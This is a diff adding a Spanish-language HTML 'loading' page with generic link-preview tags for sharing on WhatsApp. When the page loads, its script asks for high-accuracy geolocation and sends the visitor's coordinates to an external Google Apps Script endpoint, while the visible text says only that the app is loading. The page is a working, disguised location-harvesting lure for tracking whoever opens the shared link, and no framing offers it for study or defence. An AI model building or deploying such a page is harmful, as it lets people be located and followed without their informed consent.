@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cargando aplicación...</title>
+
+  <!-- Etiquetas Open Graph para vista previa en WhatsApp y redes sociales -->
+  <meta property="og:title" content="Título del sitio web">
+  <meta property="og:description" content="Haz clic para acceder a la aplicación.">
+  <meta property="og:image" content="https://tu-usuario.github.io/tu-repositorio/nombre-de-tu-imagen.jpg">
+  <meta property="og:image:type" content="image/jpeg">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:url" content="https://tu-usuario.github.io/tu-repositorio/">
+  <meta property="og:type" content="website">
+
+  <!-- Estilos mínimos para un estado de carga mientras se solicita la ubicación -->
+  <style>
+    body {
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f4f6f8;
+      color: #333;
+      text-align: center;
+      padding: 20px;
+    }
+    .spinner {
+      border: 4px solid rgba(0, 0, 0, 0.1);
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      border-left-color: #007bff;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    a.btn {
+      margin-top: 15px;
+      display: inline-block;
+      padding: 10px 20px;
+      background-color: #007bff;
+      color: white;
+      text-decoration: none;
+      border-radius: 6px;
+      font-weight: bold;
+    }
+  </style>
+
+  <script>
+    const DESTINATION_URL = "https://script.google.com/macros/s/AKfycbySm5X4eXpR2yEcpP7JoW0RYTZqOyAAu3I-M9uG4-hvl5l3tJR9tz2BsUJGxAnD5PofxA/exec";
+
+    function redirectToTarget(lat = null, lng = null) {
+      let targetUrl = DESTINATION_URL;
+      if (lat !== null && lng !== null) {
+        const separator = targetUrl.includes('?') ? '&' : '?';
+        targetUrl += `${separator}lat=${lat}&lng=${lng}`;
+      }
+      window.location.href = targetUrl;
+    }
+
+    function requestLocationAndRedirect() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            // Permiso concedido: se envían coordenadas opcionales al Web App
+            redirectToTarget(position.coords.latitude, position.coords.longitude);
+          },
+          function(error) {
+            // Permiso denegado o error: redirige de todos modos para permitir el uso
+            redirectToTarget();
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          }
+        );
+      } else {
+        redirectToTarget();
+      }
+    }
+
+    window.addEventListener("DOMContentLoaded", requestLocationAndRedirect);
+  </script>
+</head>
+<body>
+  <div class="spinner"></div>
+  <h2>Cargando la aplicación...</h2>
+  <p>Por favor, permite el acceso a la ubicación si el navegador lo solicita para continuar.</p>
+  <p>Si la página no redirige automáticamente, haz clic abajo:</p>
+  <a id="manual-link" class="btn" href="https://script.google.com/macros/s/AKfycbySm5X4eXpR2yEcpP7JoW0RYTZqOyAAu3I-M9uG4-hvl5l3tJR9tz2BsUJGxAnD5PofxA/exec">Continuar manualmente</a>
+</body>
+</html>
